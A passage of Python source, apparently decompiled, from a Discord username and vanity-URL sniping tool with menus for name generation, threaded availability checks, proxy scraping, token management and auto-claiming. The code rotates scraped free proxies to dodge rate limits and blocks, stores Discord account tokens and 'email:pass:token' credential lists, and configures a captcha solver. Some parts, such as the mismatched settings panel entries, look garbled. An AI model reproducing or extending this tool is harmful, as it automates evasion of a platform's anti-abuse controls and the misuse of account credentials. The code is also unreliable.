            if confirm('Scrape free proxies (websites + GitHub)'):
                status('info', 'Scraping proxies...')
                n = scrape_proxies()
                status('ok', f'Found {Colors.WHITE}{n}{Colors.RESET} proxies')
                proxies.reload()
                if proxies.count() > 0:
                    ok, bad = proxy_settings_menu()
                    if ok == 0:
                        status('warn', 'All scraped proxies dead. Using direct connection.')
                    else:
                        status('ok', f'Proxies: {Colors.GREEN}{ok}{Colors.RESET} kept / {Colors.RED}{bad}{Colors.RESET} removed')
                else:
                    status('warn', 'No proxies found. Using direct connection.')
            else:
                status('warn', 'Using direct connection.')
    stats.update({'checked': 0, 'available': 0, 'taken': 0, 'err_ratelimit': 0, 'err_block': 0, 'err_conn': 0, 'err_timeout': 0, 'err_other': 0, 'retries': 0, 'letters_hits': 0, 'hits': 0, 'epic': 0, 'requests': 0, 'total_response_time': 0.0})
    status('info', f'Checking {Colors.WHITE}{len(names)}{Colors.RESET} names with {Colors.WHITE}{threads}{Colors.RESET} threads')
    time.sleep(1)
    clear()
    banner()
    run_username_checker(names, threads, webhook=webhook, use_tokens=use_tokens, auto_claim=auto_claim)
    f = DATA_DIR / 'names_to_check.txt'
    if f.exists():
        try:
            f.unlink()
            status('info', f'Removed {Colors.SILVER}data/names_to_check.txt{Colors.RESET} after check')
        except OSError:
            return None
def vanity_checker_menu():
    global DIRECT_CONNECTION
    clear()
    banner()
    print_flush(f'  {Colors.BOLD}{Colors.WHITE}VANITY CHECKER{Colors.RESET}\n')
    f = DATA_DIR / 'vanity_to_check.txt'
    if not f.exists():
        f.write_text('', encoding='utf-8')
    names = f.read_text(encoding='utf-8').splitlines()
    if not names:
        status('warn', 'No vanity names loaded. Run vanity generator first.')
        input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
        return None
    else:
        threads = int(prompt('Threads', str(config.get('threads', 50))))
        DIRECT_CONNECTION = prompt('Check with your own IP (direct, no proxies)? (y/n)', 'n').strip().lower() in ('y', 'yes', '1', 't')
        if DIRECT_CONNECTION:
            status('info', 'Using your own IP directly (no proxies)')
        else:
            if proxies.proxies:
                if confirm(f'Verify {len(proxies.proxies)} proxies'):
                    ok, bad = proxy_settings_menu()
                    if ok == 0:
                        status('warn', 'All proxies dead.')
                        if confirm('Scrape free proxies (websites + GitHub)'):
                            status('info', 'Scraping proxies...')
                            n = scrape_proxies()
                            status('ok', f'Found {Colors.WHITE}{n}{Colors.RESET} proxies')
                            proxies.reload()
                            if proxies.count() > 0:
                                ok, bad = proxy_settings_menu()
                                if ok == 0:
                                    status('warn', 'All scraped proxies dead too. Using direct connection.')
                                else:
                                    status('ok', f'Proxies: {Colors.GREEN}{ok}{Colors.RESET} kept / {Colors.RED}{bad}{Colors.RESET} removed')
                            else:
                                status('warn', 'No proxies found. Using direct connection.')
                    else:
                        status('ok', f'Proxies: {Colors.GREEN}{ok}{Colors.RESET} kept / {Colors.RED}{bad}{Colors.RESET} removed')
                else:
                    status('info', f'Using {Colors.WHITE}{len(proxies.proxies)}{Colors.RESET} proxies without verification')
            else:
                status('warn', 'No proxies loaded.')
                if confirm('Scrape free proxies (websites + GitHub)'):
                    status('info', 'Scraping proxies...')
                    n = scrape_proxies()
                    status('ok', f'Found {Colors.WHITE}{n}{Colors.RESET} proxies')
                    proxies.reload()
                    if proxies.count() > 0:
                        ok, bad = proxy_settings_menu()
                        if ok == 0:
                            status('warn', 'All scraped proxies dead. Using direct connection.')
                        else:
                            status('ok', f'Proxies: {Colors.GREEN}{ok}{Colors.RESET} kept / {Colors.RED}{bad}{Colors.RESET} removed')
                    else:
                        status('warn', 'No proxies found. Using direct connection.')
                else:
                    status('warn', 'Using direct connection.')
        stats.update({'checked': 0, 'available': 0, 'taken': 0, 'err_ratelimit': 0, 'err_block': 0, 'err_conn': 0, 'err_timeout': 0, 'err_other': 0, 'retries': 0, 'letters_hits': 0, 'hits': 0, 'epic': 0, 'requests': 0, 'total_response_time': 0.0})
        status('info', f'Checking {Colors.WHITE}{len(names)}{Colors.RESET} vanity names with {Colors.WHITE}{threads}{Colors.RESET} threads')
        time.sleep(1)
        clear()
        banner()
        run_vanity_checker(names, threads)
        input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
def vanity_generator_menu():
    clear()
    banner()
    print_flush(f'  {Colors.BOLD}{Colors.WHITE}VANITY NAME GENERATOR{Colors.RESET}\n')
    for k, (label, desc) in VanityGenerator.MODES.items():
        print_flush(f'  {Colors.WHITE}[{k:>2}]{Colors.RESET} {Colors.WHITE}{label:<16}{Colors.RESET} {Colors.DIM}{desc}{Colors.RESET}')
    print_flush(f'  {Colors.WHITE}[ 0]{Colors.RESET} {Colors.WHITE}{'Load from file':<16}{Colors.RESET} {Colors.DIM}data/vanity_to_check.txt{Colors.RESET}')
    try:
        mode = int(prompt('Select mode [0-7]', '6'))
        length = int(prompt('Character length', '4'))
        count = int(prompt('How many to generate (MAX 10,000,000)', '1000'))
    except ValueError:
        status('bad', 'Invalid number')
        return None
    if length < 2 or length > 32:
        status('bad', 'Length must be 2-32')
        return None
    else:
        count = max(1, min(count, 10000000))
        if mode == 7:
            VanityGenerator._prefix = prompt('Enter prefix (letters/numbers)', '').strip().lower()
            if not VanityGenerator._prefix:
                status('bad', 'Prefix cannot be empty')
                return None
            else:
                length = max(length, len(VanityGenerator._prefix) + 1)
        if mode == 0:
            f = DATA_DIR / 'vanity_to_check.txt'
            if not f.exists():
                f.write_text('', encoding='utf-8')
            names = f.read_text(encoding='utf-8').splitlines()
        else:
            names = VanityGenerator.generate(mode, length, count)
        (DATA_DIR / 'vanity_to_check.txt').write_text('\n'.join(names), encoding='utf-8')
        status('ok', f'Generated {Colors.WHITE}{len(names)}{Colors.RESET} vanity names -> {Colors.SILVER}data/vanity_to_check.txt{Colors.RESET}')
        if names and confirm('Check these names now?'):
            threads = int(prompt('Threads', str(config.get('threads', 50))))
            input(f'\n  {Colors.DIM}Press Enter to start checking...{Colors.RESET}')
            run_vanity_checker(names, threads)
            input(f'\n  {Colors.DIM}Press Enter to return...{Colors.RESET}')
        else:
            input(f'\n  {Colors.DIM}Press Enter to return...{Colors.RESET}')
def proxy_manager_menu():
    clear()
    banner()
    print_flush(f'  {Colors.BOLD}{Colors.WHITE}PROXY MANAGER{Colors.RESET}\n')
    proxies.reload()
    status('info', f'Loaded {Colors.WHITE}{proxies.count()}{Colors.RESET} proxies from {Colors.SILVER}data/proxies.txt{Colors.RESET}')
    if not HAS_SOCKS:
        status('warn', 'PySocks not installed. SOCKS4/SOCKS5 proxies will not work.')
        status('info', 'Install with: pip install pysocks')
    if confirm('Scrape free proxies (websites + GitHub)'):
        status('info', 'Scraping proxies...')
        n = scrape_proxies()
        status('ok', f'Found {Colors.WHITE}{n}{Colors.RESET} proxies')
        proxies.reload()
        status('info', f'Total: {Colors.WHITE}{proxies.count()}{Colors.RESET} proxies in file')
    if proxies.count() > 0 and confirm('Verify proxies now?'):
            ok, bad = proxy_settings_menu()
            status('ok', f'Kept {Colors.GREEN}{ok}{Colors.RESET} / Removed {Colors.RED}{bad}{Colors.RESET}')
    input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
def settings_menu():
    while True:
        clear()
        banner()
        print_flush(f'  {Colors.BOLD}{Colors.WHITE}SETTINGS{Colors.RESET}\n')
        cfg = config.all()
        panel('CURRENT', [('Threads', cfg.get('threads', '50')), ('Timeout (s)', cfg.get('timeout', 33)), ('Remove bad proxies', 'yes' if cfg.get('remove_proxies', True) else 'no'), ('Use tokens', 'yes' if cfg.get('use_tokens') else 'no'), ('Claim tokens', claim_tokens.count()), ('2captcha' if cfg.get('proxy_cooldown', 12) else 'none'), ('Captcha solver', 'set' if cfg.get('webhook') else 'none')])
        print_flush(f'  {Colors.WHITE}[1]{Colors.RESET} Threads')
        print_flush(f'  {Colors.WHITE}[2]{Colors.RESET} Timeout (s)')
        print_flush(f'  {Colors.WHITE}[3]{Colors.RESET} Remove bad proxies (auto)')
        print_flush(f'  {Colors.WHITE}[4]{Colors.RESET} Use tokens (on/off)')
        print_flush(f'  {Colors.WHITE}[5]{Colors.RESET} Manage Discord tokens')
        print_flush(f'  {Colors.WHITE}[6]{Colors.RESET} Webhook')
        print_flush(f'  {Colors.WHITE}[7]{Colors.RESET} Auto claim user (email:pass:token)')
        print_flush(f'  {Colors.WHITE}[8]{Colors.RESET} Proxy cooldown (s)')
        print_flush(f'  {Colors.WHITE}[9]{Colors.RESET} Captcha Solver Settings')
        print_flush(f'  {Colors.WHITE}[10]{Colors.RESET} Request delay (s)')
        print_flush(f'  {Colors.WHITE}[0]{Colors.RESET} Back to main menu')
        choice = prompt('Setting', '0')
        if choice == '1':
            try:
                config.set('threads', int(prompt('Threads', str(cfg.get('threads', 50)))))
            except ValueError:
                status('bad', 'invalid number')
        else:
            if choice == '2':
                try:
                    config.set('timeout', int(prompt('Timeout seconds', '33')))
                except ValueError:
                    status('bad', 'invalid number')
            else:
                if choice == '3':
                    config.set('remove_proxies', confirm('Remove bad proxies automatically?'))
                else:
                    if choice == '4':
                        config.set('use_tokens', confirm('Use tokens for checking (requires valid tokens)?'))
                    else:
                        if choice == '5':
                            pass
                            tokens.reload()
                            status('info', f'{Colors.WHITE}{tokens.count()}{Colors.RESET} token(s) in {Colors.SILVER}data/tokens.txt{Colors.RESET}')
                            print_flush(f'  {Colors.WHITE}[1]{Colors.RESET} Paste tokens now (one per line)')
                            print_flush(f'  {Colors.WHITE}[2]{Colors.RESET} Load from file')
                            print_flush(f'  {Colors.WHITE}[3]{Colors.RESET} View count only')
                            sub = prompt('Choose', '3')
                            if sub == '1':
                                print_flush(f'  {Colors.DIM}Paste tokens, empty line to finish:{Colors.RESET}')
                                lines = []
                                while True:
                                    t = input('  > ').strip()
                                    if not t:
                                        break
                                    else:
                                        lines.append(t)
                                (DATA_DIR / 'tokens.txt').write_text('\n'.join(lines), encoding='utf-8')
                                tokens.reload()
                                status('ok', f'Saved {Colors.WHITE}{tokens.count()}{Colors.RESET} token(s)')
                            else:
                                if sub == '2':
                                    path = prompt('File path')
                                    try:
                                        txt = Path(path).read_text(encoding='utf-8')
                                        (DATA_DIR / 'tokens.txt').write_text(txt, encoding='utf-8')
                                        tokens.reload()
                                        status('ok', f'Loaded {Colors.WHITE}{tokens.count()}{Colors.RESET} token(s)')
                                    except Exception as e:
                                        status('bad', f'could not read file: {e}')
                                else:
                                    if sub == '3':
                                        break
                                    else:
                                        status('bad', 'unknown option')
                        else:
                            if choice == '6':
                                webhook_url = prompt('Webhook URL (leave blank to disable)')
                                config.set('webhook', webhook_url or None)
                                if webhook_url:
                                    config.set('message', prompt('Message (<name> <elapsed> <RPS>)', '<name> is available!'))
                                status('ok', 'Webhook updated')
                            else:
                                if choice == '7':
                                    current = config.get('auto_claim', True)
                                    enable = confirm(f'Auto claim user? (currently: {('ON' if current else 'OFF')})')
                                    config.set('auto_claim', enable)
                                    if enable:
                                        status('info', f'Format: {Colors.WHITE}email:pass:token{Colors.RESET} in {Colors.SILVER}data/tokensautoclaim.txt{Colors.RESET}')
                                        claim_tokens.reload()
                                        status('info', f'Found {Colors.WHITE}{claim_tokens.count()}{Colors.RESET} claim token(s)')
                                else:
                                    if choice == '8':
                                        try:
                                            config.set('proxy_cooldown', int(prompt('Proxy cooldown seconds', str(cfg.get('proxy_cooldown', 12)))))
                                        except ValueError:
                                            status('bad', 'invalid number')
                                    else:
                                        if choice == '9':
                                            captcha_solver_settings()
                                        else:
                                            if choice == '10':
                                                try:
                                                    config.set('request_delay', int(prompt('Request delay seconds (0 = no delay)', str(cfg.get('request_delay', 0)))))
                                                except ValueError:
                                                    status('bad', 'invalid number')
                                            else:
                                                if choice == '0':
                                                    return None
                                                else:
                                                    status('bad', 'unknown option')
        if choice != '0':
            input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
MENU_OPTIONS = [('01', 'Username Generator', 'Generate custom username lists'), ('02', 'Username Checker', 'Check Discord username availability'), ('03', 'Auto Sniper', 'Generate + Check automatically'), ('04', 'Vanity Checker', 'Check multiple vanity URLs in parallel'), ('05', 'Vanity Generator', 'Generate vanity names for checking'), ('06', 'Proxy Manager', 'Load and verify proxies'), ('07', 'Settings', 'Threads, Timeout, Webhook')]
MENU_HANDLERS = {'01': username_generator_menu, '02': username_checker_menu, '03': auto_sniper_menu, '04': vanity_checker_menu, '05': vanity_generator_menu, '06': proxy_manager_menu, '07': settings_menu}
def main():
    iloveyou()
    while True:
        clear()
        banner()
        menu(MENU_OPTIONS)
        choice = prompt('Select option', '01') or '01'
        if choice in ('q', 'exit', 'quit'):
            return None
        else:
            handler = MENU_HANDLERS.get(choice.zfill(2) if choice.isdigit() else choice)
            if handler:
                try:
                    handler()
                except KeyboardInterrupt:
                    status('warn', 'interrupted')
                    time.sleep(1)
                except Exception as e:
                    log.log(f'fatal: {e}')
                    status('bad', f'{e}')
                    traceback.print_exc()
                    input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
                else:
                    pass
            else:
                status('warn', 'invalid option')
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print_flush(f'\n{Colors.GREY}bye.{Colors.RESET}')
